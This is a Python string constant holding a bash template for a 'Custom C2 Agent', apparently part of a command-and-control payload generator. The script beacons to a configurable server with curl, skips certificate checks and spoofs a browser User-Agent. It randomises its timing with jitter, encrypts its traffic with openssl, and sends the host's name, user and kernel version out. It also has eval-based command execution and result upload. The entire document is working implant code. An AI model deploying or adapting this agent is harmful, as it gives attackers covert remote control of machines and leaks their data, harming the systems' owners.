BASH_TEMPLATE = '''#!/bin/bash
# Custom C2 Agent - Linux Bash

SERVER_URL="{server_url}"
AUTH_TOKEN="{auth_token}"
ENCRYPTION_PASSWORD="{encryption_password}"
BEACON_INTERVAL={beacon_interval}
JITTER={jitter}

encrypt_data() {{
    local data="$1"
    echo "$data" | openssl enc -aes-256-cbc -a -salt -pass pass:"$ENCRYPTION_PASSWORD" 2>/dev/null
}}

decrypt_data() {{
    local encrypted="$1"
    echo "$encrypted" | openssl enc -aes-256-cbc -d -a -pass pass:"$ENCRYPTION_PASSWORD" 2>/dev/null
}}

get_system_info() {{
    local session_id="$1"
    local hostname=$(hostname)
    local username=$(whoami)
    local os_type="Linux"
    local os_version=$(uname -r)
    
    local json="{{"
    if [ -n "$session_id" ]; then
        json="${{json}}\\"session_id\\":\\"$session_id\\","
    fi
    json="${{json}}\\"hostname\\":\\"$hostname\\","
    json="${{json}}\\"username\\":\\"$username\\","
    json="${{json}}\\"os_type\\":\\"$os_type\\","
    json="${{json}}\\"os_version\\":\\"$os_version\\"}}"
    
    echo "$json"
}}

execute_command() {{
    local command="$1"
    eval "$command" 2>&1
}}

send_beacon() {{
    local session_id="$1"
    local sys_info=$(get_system_info "$session_id")
    local encrypted=$(encrypt_data "$sys_info")
    local payload="{{\\"data\\":\\"$encrypted\\"}}"
    
    local response=$(curl -s -k \\
        -X POST \\
        -H "Authorization: Bearer $AUTH_TOKEN" \\
        -H "Content-Type: application/json" \\
        -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64)" \\
        -d "$payload" \\
        --max-time 30 \\
        "$SERVER_URL/api/v1/sync" 2>/dev/null)
    
    echo "$response"
}}

submit_results() {{
    local session_id="$1"
    local task_id="$2"
    local output="$3"
    
    local result_json="{{\\"session_id\\":\\"$session_id\\",\\"task_id\\":\\"$task_id\\",\\"output\\":\\"$output\\"}}"
    local encrypted=$(encrypt_data "$result_json")
    local payload="{{\\"data\\":\\"$encrypted\\"}}"
    
    curl -s -k \\
        -X POST \\
        -H "Authorization: Bearer $AUTH_TOKEN" \\
        -H "Content-Type: application/json" \\
        -d "$payload" \\
        --max-time 30 \\
        "$SERVER_URL/api/v1/results" &>/dev/null
}}

extract_json_value() {{
    local json="$1"
    local key="$2"
    echo "$json" | grep -o "\\"$key\\":\\"[^\\"]*\\"" | cut -d'"' -f4
}}

start_agent() {{
    local session_id=""
    
    echo "[*] Agent starting..."
    echo "[*] Server: $SERVER_URL"
    echo "[*] Beacon: ${{BEACON_INTERVAL}}s ± ${{JITTER}}s"
    
    while true; do
        local response=$(send_beacon "$session_id")
        
        if [ -n "$response" ] && [ "$response" != "null" ]; then
            if [ -z "$session_id" ]; then
                local encrypted_data=$(extract_json_value "$response" "data")
                if [ -n "$encrypted_data" ]; then
                    local decrypted=$(decrypt_data "$encrypted_data")
                    session_id=$(extract_json_value "$decrypted" "session_id")
                    
                    if [ -n "$session_id" ]; then
                        echo "[+] Session: $session_id"
                    fi
                fi
            fi
        fi
        
        local jitter_amount=$((RANDOM % (JITTER * 2) - JITTER))
        local sleep_time=$((BEACON_INTERVAL + jitter_amount))
        
        if [ $sleep_time -lt 1 ]; then
            sleep_time=1
        fi
        
        sleep $sleep_time
    done
}}

start_agent
'''